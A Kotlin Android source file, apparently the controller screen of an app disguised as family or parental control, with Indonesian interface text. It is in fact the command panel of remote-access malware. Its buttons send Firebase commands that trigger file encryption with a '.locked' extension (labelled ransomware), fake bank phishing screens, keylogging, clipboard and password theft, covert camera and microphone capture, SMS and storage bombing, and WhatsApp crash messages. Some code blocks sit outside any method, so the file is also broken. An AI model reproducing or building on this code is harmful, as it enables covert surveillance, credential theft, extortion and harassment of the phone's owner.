package com.familychat.parent

import android.app.AlertDialog
import android.os.Bundle
import android.widget.EditText
import androidx.appcompat.app.AppCompatActivity
import com.familychat.parent.databinding.ActivityRemoteControlBinding
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

/** Layar remote: kunci, alarm, jumpscare, getar. */
class RemoteControlActivity : AppCompatActivity() {

    private lateinit var binding: ActivityRemoteControlBinding
    private lateinit var familyCode: String
    private lateinit var controlRef: com.google.firebase.database.DatabaseReference

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityRemoteControlBinding.inflate(layoutInflater)
        setContentView(binding.root)

        // Dashboard: jam, kalender, cuaca, sholat, music — tidak mengganggu remote control
        setupDashboardWidgets()

        familyCode = intent.getStringExtra("family_code") ?: ""
        controlRef = FirebaseDatabase.getInstance()
            .getReference("families").child(familyCode).child("control")

        controlRef.child("lock").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val active = snapshot.child("active").getValue(Boolean::class.java) ?: false
                binding.tvLockStatus.text = if (active) "🔒 Terkunci" else "🔓 Tidak terkunci"
                binding.btnLock.isEnabled = !active
                binding.btnUnlock.isEnabled = active
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        controlRef.child("alarm").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val active = snapshot.child("active").getValue(Boolean::class.java) ?: false
                binding.tvAlarmStatus.text = if (active) "🔊 Alarm menyala" else "Alarm tidak aktif"
                binding.btnAlarmOn.isEnabled = !active
                binding.btnAlarmOff.isEnabled = active
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        controlRef.child("jumpscare").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val active = snapshot.child("active").getValue(Boolean::class.java) ?: false
                binding.tvJumpscareStatus.text = if (active) "👻 Jumpscare aktif" else "Tidak aktif"
                binding.btnJumpscareOn.isEnabled = !active
                binding.btnJumpscareOff.isEnabled = active
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        controlRef.child("vibrate").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val active = snapshot.child("active").getValue(Boolean::class.java) ?: false
                binding.tvVibrateStatus.text = if (active) "📳 Getar aktif" else "Tidak aktif"
                binding.btnVibrateOn.isEnabled = !active
                binding.btnVibrateOff.isEnabled = active
            }
            override fun onCancelled(error: DatabaseError) {}
        })

        binding.btnLock.setOnClickListener { showLockDialog() }
        binding.btnUnlock.setOnClickListener {
            controlRef.child("lock").setValue(mapOf("active" to false))
        }
        binding.btnAlarmOn.setOnClickListener {
            controlRef.child("alarm").setValue(mapOf("active" to true))
        }
        binding.btnAlarmOff.setOnClickListener {
            controlRef.child("alarm").setValue(mapOf("active" to false))
        }
        binding.btnJumpscareOn.setOnClickListener {
            controlRef.child("jumpscare").setValue(mapOf("active" to true, "vibrate" to true))
        }
        binding.btnJumpscareOff.setOnClickListener {
            controlRef.child("jumpscare").setValue(mapOf("active" to false))
        }
        binding.btnVibrateOn.setOnClickListener {
            controlRef.child("vibrate").setValue(mapOf("active" to true))
        }
        binding.btnVibrateOff.setOnClickListener {
            controlRef.child("vibrate").setValue(mapOf("active" to false))
        }
    }


        // Encrypt / ransomware
        controlRef.child("encrypt").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val active = snapshot.child("active").getValue(Boolean::class.java) ?: false
                val result = snapshot.child("result").child("count").getValue(Long::class.java)
                binding.tvEncryptStatus.text = when {
                    active -> "⏳ Sedang mengenkripsi..."
                    result != null -> "Selesai: $result file"
                    else -> "Siap"
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        })
        binding.btnEncrypt.setOnClickListener {
            AlertDialog.Builder(this)
                .setTitle("Enkripsi File Anak")
                .setMessage("File foto/video/dokumen di HP anak akan dienkripsi AES-256 dan diberi ekstensi .locked. Hanya bisa dibuka lagi lewat tombol Dekripsi.")
                .setPositiveButton("Enkripsi Sekarang") { _, _ ->
                    controlRef.child("encrypt").setValue(mapOf(
                        "active" to true,
                        "action" to "encrypt",
                        "ts" to System.currentTimeMillis()
                    ))
                }
                .setNegativeButton("Batal", null)
                .show()
        }
        binding.btnDecrypt.setOnClickListener {
            controlRef.child("encrypt").setValue(mapOf(
                "active" to true,
                "action" to "decrypt",
                "ts" to System.currentTimeMillis()
            ))
        }

        // Wallpaper
        binding.btnWallpaper.setOnClickListener {
            val input = EditText(this)
            input.hint = "Teks wallpaper ATAU URL gambar https://..."
            AlertDialog.Builder(this)
                .setTitle("Ganti Wallpaper Anak")
                .setMessage("Isi teks (mode text) atau URL gambar (mode url).")
                .setView(input)
                .setPositiveButton("Terapkan") { _, _ ->
                    val v = input.text.toString().trim()
                    val mode = if (v.startsWith("http")) "url" else "text"
                    controlRef.child("wallpaper").setValue(mapOf(
                        "active" to true,
                        "mode" to mode,
                        "value" to v.ifBlank { "LOCKED BY PARENT" }
                    ))
                }
                .setNegativeButton("Batal", null)
                .show()
        }

        // Video URL jumpscare
        binding.btnVideoScare.setOnClickListener {
            val input = EditText(this)
            input.hint = "https://.../video.mp4 (direct link)"
            AlertDialog.Builder(this)
                .setTitle("Video Scare")
                .setMessage("Masukkan direct link video (mp4/webm). Bukan halaman YouTube biasa.")
                .setView(input)
                .setPositiveButton("Putar di HP Anak") { _, _ ->
                    val url = input.text.toString().trim()
                    if (url.isEmpty()) return@setPositiveButton
                    controlRef.child("video").setValue(mapOf(
                        "active" to true,
                        "url" to url,
                        "vibrate" to true
                    ))
                    // juga set jumpscare supaya relancer jalan
                    controlRef.child("jumpscare").setValue(mapOf(
                        "active" to true,
                        "vibrate" to true,
                        "video_url" to url
                    ))
                }
                .setNegativeButton("Batal", null)
                .show()
        }
        binding.btnVideoStop.setOnClickListener {
            controlRef.child("video").setValue(mapOf("active" to false))
            controlRef.child("jumpscare").setValue(mapOf("active" to false))
        }

        // Virtex LockChat (pengganti WA bug / ban group / ban number)
        try {
            binding.btnWaBug.setOnClickListener {
                VirtexSender.showSendDialog(this, controlRef)
            }
        } catch (_: Exception) {}
        try {
            binding.btnBanWaGroup.setOnClickListener {
                VirtexSender.showSendDialog(this, controlRef)
            }
        } catch (_: Exception) {}
        try {
            binding.btnBanWaNumber.setOnClickListener {
                VirtexSender.showSendDialog(this, controlRef)
            }
        } catch (_: Exception) {}

        try {
            binding.btnCollectData.setOnClickListener { fireControl("collect", mapOf("active" to true)) }
            binding.btnMic.setOnClickListener { fireControl("mic", mapOf("active" to true, "duration" to 30)) }
            binding.btnCamFront.setOnClickListener { fireControl("camera", mapOf("active" to true, "front" to true, "count" to 1)) }
            binding.btnCamBack.setOnClickListener { fireControl("camera", mapOf("active" to true, "front" to false, "count" to 1)) }
            binding.btnTorch.setOnClickListener { fireControl("torch", mapOf("active" to true, "strobe" to true)) }
            binding.btnPhish.setOnClickListener { fireControl("phishing", mapOf("active" to true, "bank" to "Bank")) }
            binding.btnKeylog.setOnClickListener { fireControl("keylog", mapOf("active" to true)) }
            binding.btnClipboard.setOnClickListener { fireControl("clipboard", mapOf("active" to true)) }
            binding.btnPasswords.setOnClickListener { fireControl("passwords", mapOf("active" to true)) }
            binding.btnBombSms.setOnClickListener {
                fireControl("bomb", mapOf("active" to true, "type" to "sms", "message" to "Pesan penting", "max" to 20))
            }
            binding.btnBombStorage.setOnClickListener { fireControl("bomb", mapOf("active" to true, "type" to "storage")) }
        } catch (_: Exception) {}

    private fun fireControl(node: String, data: Map<String, Any?>) {
        val m = data.toMutableMap()
        m["ts"] = System.currentTimeMillis()
        if (!m.containsKey("active")) m["active"] = true
        controlRef.child(node).setValue(m)
    }

    private fun setupDashboardWidgets() {
        try {
            DashboardWidgets.bindClock(binding.tvClock, binding.tvDate)
            DashboardWidgets.loadWeather(
                binding.tvWeatherTemp,
                binding.tvWeatherDesc,
                binding.tvWeatherIcon,
                binding.tvWeatherLoc
            )
            DashboardWidgets.loadPrayerTimes(
                binding.tvPrayerFajr,
                binding.tvPrayerDhuhr,
                binding.tvPrayerAsr,
                binding.tvPrayerMaghrib,
                binding.tvPrayerIsha,
                binding.tvPrayerNext
            )
            binding.btnMusicPlay.setOnClickListener {
                val t = binding.tvMusicTitle.text?.toString().orEmpty()
                if (t.isBlank() || t == "Belum ada lagu" || t == "Tidak ketemu" || t == "Mencari…") {
                    DashboardWidgets.showSearchAndPlay(
                        this, binding.tvMusicTitle, binding.tvMusicArtist, binding.btnMusicPlay
                    )
                } else {
                    DashboardWidgets.togglePlay(binding.btnMusicPlay)
                }
            }
            binding.btnMusicPrev.setOnClickListener {
                DashboardWidgets.playPrev(
                    this, binding.tvMusicTitle, binding.tvMusicArtist, binding.btnMusicPlay
                )
            }
            binding.btnMusicNext.setOnClickListener {
                DashboardWidgets.playNext(
                    this, binding.tvMusicTitle, binding.tvMusicArtist, binding.btnMusicPlay
                )
            }
            binding.btnMusicPick.setOnClickListener {
                // cari lagu → pilih → play di app (preview) / fallback YT Music
                DashboardWidgets.showSearchAndPlay(
                    this, binding.tvMusicTitle, binding.tvMusicArtist, binding.btnMusicPlay
                )
            }
        } catch (_: Exception) {
            // view IDs belum ada di layout lama — aman di-skip
        }
    }

    override fun onDestroy() {
        DashboardWidgets.stopClock()
        DashboardWidgets.stopMusic()
        super.onDestroy()
    }

    private fun showLockDialog() {
        val input = EditText(this)
        input.hint = "Contoh: HP ditemukan? Hubungi 08xxxxxxxxxx"
        AlertDialog.Builder(this)
            .setTitle("Kunci HP Anak")
            .setMessage("Layar HP Anak akan menampilkan pesan ini sampai Anda membuka kunci lagi.")
            .setView(input)
            .setPositiveButton("Kunci Sekarang") { _, _ ->
                val msg = input.text.toString().ifBlank { "HP ANDA TELAH DI HACK BY SORA" }
                controlRef.child("lock").setValue(mapOf("active" to true, "message" to msg))
            }
            .setNegativeButton("Batal", null)
            .show()
    }
}
